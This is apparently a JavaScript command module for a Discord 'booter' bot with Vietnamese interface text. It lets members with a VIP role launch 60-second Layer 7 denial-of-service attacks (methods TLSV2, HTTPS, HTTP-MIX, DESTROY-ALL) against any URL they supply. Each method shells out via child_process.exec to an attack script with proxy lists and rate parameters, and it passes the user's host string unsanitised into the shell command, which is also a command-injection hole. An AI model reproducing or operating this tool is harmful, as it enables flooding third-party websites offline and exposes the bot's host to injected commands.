const { doesNotReject } = require("assert");
const { MessageEmbed } = require("discord.js");
const { setFlagsFromString } = require("v8");
const ayarlar = require('../../ayarlar.json');
var version = ayarlar.versionbot;
var roleID1 = ayarlar.roleID1;
var img = ayarlar.img;
var photovip = ayarlar.photovip;
var randomgifvip = photovip[Math.floor((Math.random() * photovip.length))];
var Blacklists = ayarlar.blacklists;

module.exports = {
    name: 'vip',
    description: 'Tấn công trang Web ( Layer7 )',
    type: 'CHAT_INPUT',
    cooldown: 60,
    options: [
    {
      name: "methods",
      description: "Phương pháp tấn công",
      required: true,
      type: "STRING",
      choices: [
      { name: `TLSV2`, value: `TLSV2`, inline: true },
      { name: `HTTPS`, value: `HTTPS`, inline: true },
      { name: `HTTP-MIX`, value: `HTTP-MIX`, inline: true },
      { name: `DESTROY-ALL`, value: `DESTROY-ALL`, inline: true },
      ],
    },
    {
      name: "host",
      description: "Địa chỉ tấn công",
      required: true,
      type: "STRING",
    },
  ],

  run: async (client, interaction) => {

    if (!interaction.member.roles.cache.has(roleID1))
      return interaction.reply({
        embeds: [
          new MessageEmbed()
          .setColor("RANDOM")
            .setDescription(`Chỉ có <@&${roleID1}> mới được dùng lệnh này.`)
            .setFooter({ text: "Made by idle" })
            .setTimestamp(),
        ], ephemeral: true 
      });
    const roomvip = ayarlar.commandroom.VIP
    if (interaction.channel.id != roomvip)
      return interaction.reply({
        embeds: [
          new MessageEmbed()
          .setColor("RANDOM")
            .setDescription(`Chỉ dùng được lệnh này trong <#${roomvip}>.`)
            .setFooter({ text: "Made by idle", iconURL: img })
            .setTimestamp(),
        ], ephemeral: true 
      });

    const methods = interaction.options.getString("methods")
   const host = interaction.options.getString("host")
        const hostLink = /https?:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)/;
        if (!hostLink.test(host)) {
            interaction.reply({
            embeds: [
              new MessageEmbed()
                .setColor("RANDOM")
                .setTitle("Host không hợp lệ!")
                .setDescription("`Định dạng: https://www.example.com`")
                .setFooter({ text: "Made by idle", iconURL: img })
                .setTimestamp()
            ], ephemeral: true,
          });
            return;
        }
        if (
          Blacklists.some((word) => interaction.toString().toLowerCase().includes(word))
        ) {
          interaction.reply({
            embeds: [
              new MessageEmbed()
                .setColor("RANDOM")
                .setDescription(
                  `${host} nằm trong danh sách đen nên không thể tấn công.`
                )
                .setFooter({
                  text: `Made by idle`,
                  iconURL: img,
                })
                .setTimestamp()
              ], ephemeral: true,
          });
          return;
        }
    var photovip = ayarlar.photovip;
    var randomgif = photovip[Math.floor((Math.random() * photovip.length))];

    if(methods === "HTTPS") {
         
      var chetmemay = methods;
  
      var exec = require('child_process').exec
        exec(`node methods/L7/${chetmemay}.js ${host} proxy.txt 60 5 1000`, (error, stdout, stderr) => {
      });
  
      console.log('Một cuộc tấn công khởi chạy ID Discord:' +  interaction.guild.id)
      var gifler = ["https://media.discordapp.net/attachments/953949680344125441/1071675126388637777/1507452243_tumblr_og092aQQYM1tydz8to1_540.gif", "https://media.discordapp.net/attachments/953949680344125441/1071674664914534501/tai_xuong.gif", "https://media.discordapp.net/attachments/953949680344125441/1071673058022150234/1642306765_683_Hinh-anh-dong-anime-dep-ngau-buon-chat-sinh-dong.gif", "https://media.discordapp.net/attachments/953949680344125441/1065608797722255400/685986758e01fdfbc49cfe882397ef0c.gif","https://cdn.discordapp.com/attachments/1032269044952354817/1054992268353884180/VIP_10.gif","https://cdn.discordapp.com/attachments/1032269044952354817/1054992258837000243/VIP_8.gif","https://cdn.discordapp.com/attachments/1032269044952354817/1054992208719253554/VIP_6.gif","https://cdn.discordapp.com/attachments/1032269044952354817/1054992172115562556/VIP_5.gif","https://cdn.discordapp.com/attachments/1032269044952354817/1054992167120162846/VIP_4.gif","https://cdn.discordapp.com/attachments/1032269044952354817/1054992156017836032/VIP_3.gif","https://cdn.discordapp.com/attachments/1032269044952354817/1054992150200324138/VIP_2.gif",]
      var randomgif = gifler[Math.floor((Math.random() * gifler.length))]
        const embed = new MessageEmbed()
          .setColor("RANDOM")
          .setTitle(version)
          .addFields(
          {
            name: "**`👨‍💻 Người Dùng:`**",
            value: `\n[ ${interaction.user.username} ]`,
            inline: false,
          },
          {
            name: "**`🔗 Host:`**",
            value: `\n[ ${host} ]`,
            inline: false,
          },
          {
            name: "**`💥 Phương Pháp:`**",
            value: `\n[ ${methods} ]`,
            inline: false,
          },
          {
            name: "**`🕒 Thời Gian:`**",
            value: `\n[ 60 second ]`,
            inline: false,
          },
          {
            name: "**`🔰 Mode:`**",
            value: `\n[ Layer7 ]`,
            inline: false,
          },
          {
            name: "**`💸 Plan:`**",
            value: `\n[ VIP ]`,
            inline: false,
          })
          .setImage(randomgifvip)
          .setFooter('Made by idle', img)
          .setTimestamp();
            interaction.user.send({ embeds: [embed] }).then((message) => {
                setTimeout(function () {
                }, 3000)
              })
          }

          if(methods === "HTTP-MIX") {
         
            var chetmemay = methods;
        
            var exec = require('child_process').exec
              exec(`node methods/L7/${chetmemay}.js ${host} 60`, (error, stdout, stderr) => {
            });
        
            console.log('Một cuộc tấn công khởi chạy ID Discord:' +  interaction.guild.id)
            var gifler = ["https://media.discordapp.net/attachments/953949680344125441/1071675126388637777/1507452243_tumblr_og092aQQYM1tydz8to1_540.gif", "https://media.discordapp.net/attachments/953949680344125441/1071674664914534501/tai_xuong.gif", "https://media.discordapp.net/attachments/953949680344125441/1071673058022150234/1642306765_683_Hinh-anh-dong-anime-dep-ngau-buon-chat-sinh-dong.gif", "https://media.discordapp.net/attachments/953949680344125441/1065608797722255400/685986758e01fdfbc49cfe882397ef0c.gif","https://cdn.discordapp.com/attachments/1032269044952354817/1054992268353884180/VIP_10.gif","https://cdn.discordapp.com/attachments/1032269044952354817/1054992258837000243/VIP_8.gif","https://cdn.discordapp.com/attachments/1032269044952354817/1054992208719253554/VIP_6.gif","https://cdn.discordapp.com/attachments/1032269044952354817/1054992172115562556/VIP_5.gif","https://cdn.discordapp.com/attachments/1032269044952354817/1054992167120162846/VIP_4.gif","https://cdn.discordapp.com/attachments/1032269044952354817/1054992156017836032/VIP_3.gif","https://cdn.discordapp.com/attachments/1032269044952354817/1054992150200324138/VIP_2.gif",]
            var randomgif = gifler[Math.floor((Math.random() * gifler.length))]
              const embed = new MessageEmbed()
                .setColor("RANDOM")
                .setTitle(version)
                .addFields(
                {
                  name: "**`👨‍💻 Người Dùng:`**",
                  value: `\n[ ${interaction.user.username} ]`,
                  inline: false,
                },
                {
                  name: "**`🔗 Host:`**",
                  value: `\n[ ${host} ]`,
                  inline: false,
                },
                {
                  name: "**`💥 Phương Pháp:`**",
                  value: `\n[ ${methods} ]`,
                  inline: false,
                },
                {
                  name: "**`🕒 Thời Gian:`**",
                  value: `\n[ 60 second ]`,
                  inline: false,
                },
                {
                  name: "**`🔰 Mode:`**",
                  value: `\n[ Layer7 ]`,
                  inline: false,
                },
                {
                  name: "**`💸 Plan:`**",
                  value: `\n[ VIP ]`,
                  inline: false,
                })
                .setImage(randomgifvip)
                .setFooter('Made by idle', img)
                .setTimestamp();
                  interaction.user.send({ embeds: [embed] }).then((message) => {
                      setTimeout(function () {
                      }, 3000)
                    })
                }

                if(methods === "DESTROY-ALL") {
         
                  var chetmemay = methods;
              
                  var exec = require('child_process').exec
                    exec(`node methods/L7/${chetmemay}.js ${host} 60 1000`, (error, stdout, stderr) => {
                  });
              
                  console.log('Một cuộc tấn công khởi chạy ID Discord:' +  interaction.guild.id)
                  var gifler = ["https://media.discordapp.net/attachments/953949680344125441/1071675126388637777/1507452243_tumblr_og092aQQYM1tydz8to1_540.gif", "https://media.discordapp.net/attachments/953949680344125441/1071674664914534501/tai_xuong.gif", "https://media.discordapp.net/attachments/953949680344125441/1071673058022150234/1642306765_683_Hinh-anh-dong-anime-dep-ngau-buon-chat-sinh-dong.gif", "https://media.discordapp.net/attachments/953949680344125441/1065608797722255400/685986758e01fdfbc49cfe882397ef0c.gif","https://cdn.discordapp.com/attachments/1032269044952354817/1054992268353884180/VIP_10.gif","https://cdn.discordapp.com/attachments/1032269044952354817/1054992258837000243/VIP_8.gif","https://cdn.discordapp.com/attachments/1032269044952354817/1054992208719253554/VIP_6.gif","https://cdn.discordapp.com/attachments/1032269044952354817/1054992172115562556/VIP_5.gif","https://cdn.discordapp.com/attachments/1032269044952354817/1054992167120162846/VIP_4.gif","https://cdn.discordapp.com/attachments/1032269044952354817/1054992156017836032/VIP_3.gif","https://cdn.discordapp.com/attachments/1032269044952354817/1054992150200324138/VIP_2.gif",]
                  var randomgif = gifler[Math.floor((Math.random() * gifler.length))]
                    const embed = new MessageEmbed()
                      .setColor("RANDOM")
                      .setTitle(version)
                      .addFields(
                      {
                        name: "**`👨‍💻 Người Dùng:`**",
                        value: `\n[ ${interaction.user.username} ]`,
                        inline: false,
                      },
                      {
                        name: "**`🔗 Host:`**",
                        value: `\n[ ${host} ]`,
                        inline: false,
                      },
                      {
                        name: "**`💥 Phương Pháp:`**",
                        value: `\n[ ${methods} ]`,
                        inline: false,
                      },
                      {
                        name: "**`🕒 Thời Gian:`**",
                        value: `\n[ 60 second ]`,
                        inline: false,
                      },
                      {
                        name: "**`🔰 Mode:`**",
                        value: `\n[ Layer7 ]`,
                        inline: false,
                      },
                      {
                        name: "**`💸 Plan:`**",
                        value: `\n[ VIP ]`,
                        inline: false,
                      })
                      .setImage(randomgifvip)
                      .setFooter('Made by idle', img)
                      .setTimestamp();
                        interaction.user.send({ embeds: [embed] }).then((message) => {
                            setTimeout(function () {
                            }, 3000)
                          })
                      }

if(methods === "TLSV2") {
         
    var chetmemay = methods;

    var exec = require('child_process').exec
    exec(`node methods/L7/${chetmemay}.js ${host} ${'60 1300 5 proxy.txt GET'}`, (error, stdout, stderr) => {
    });

    console.log('Bắt đầu 1 cuộc tấn công Từ ID Discord:' +  interaction.guild.id)
    var gifler = ["https://media.discordapp.net/attachments/953949680344125441/1071675126388637777/1507452243_tumblr_og092aQQYM1tydz8to1_540.gif", "https://media.discordapp.net/attachments/953949680344125441/1071674664914534501/tai_xuong.gif", "https://media.discordapp.net/attachments/953949680344125441/1071673058022150234/1642306765_683_Hinh-anh-dong-anime-dep-ngau-buon-chat-sinh-dong.gif", "https://media.discordapp.net/attachments/953949680344125441/1065608797722255400/685986758e01fdfbc49cfe882397ef0c.gif","https://cdn.discordapp.com/attachments/1032269044952354817/1054992268353884180/VIP_10.gif","https://cdn.discordapp.com/attachments/1032269044952354817/1054992258837000243/VIP_8.gif","https://cdn.discordapp.com/attachments/1032269044952354817/1054992208719253554/VIP_6.gif","https://cdn.discordapp.com/attachments/1032269044952354817/1054992172115562556/VIP_5.gif","https://cdn.discordapp.com/attachments/1032269044952354817/1054992167120162846/VIP_4.gif","https://cdn.discordapp.com/attachments/1032269044952354817/1054992156017836032/VIP_3.gif","https://cdn.discordapp.com/attachments/1032269044952354817/1054992150200324138/VIP_2.gif",]
    var randomgif = gifler[Math.floor((Math.random() * gifler.length))]
      const embed = new MessageEmbed()
        .setColor("RANDOM")
        .setTitle(version)
        .addFields(
          {
            name: "**`👨‍💻Người dùng:`**",
            value: `\n [ ${interaction.user.username} ] \n`,
            inline: true,
          },
          {
            name: "**`🔗Host:`**",
            value: `\n [ ${host} ] \n`,
            inline: true,
          },
          {
            name: "**`💥 Phương Pháp:`**",
            value: `\n [ ${methods} ] \n`,
            inline: true,
          },
          {
            name: "**`🕒Thời gian:`**",
            value: `\n [ 60 giây ] \n`,
            inline: true,
          },
          {
            name: "**`🔰 Mode:`**",
            value: `\n [ Layer7 ] \n\`\`\``,
            inline: true,
          },
          {
            name: "**`💸Plan:`**",
            value: `\n [ VIP ] \n`,
            inline: true,
          })
        .setImage(randomgifvip)
        .setFooter('Made by idle', img)
        .setTimestamp();
          interaction.user.send({ embeds: [embed] }).then((message) => {
              setTimeout(function () {
              }, 1000)
            })
        }
    }
}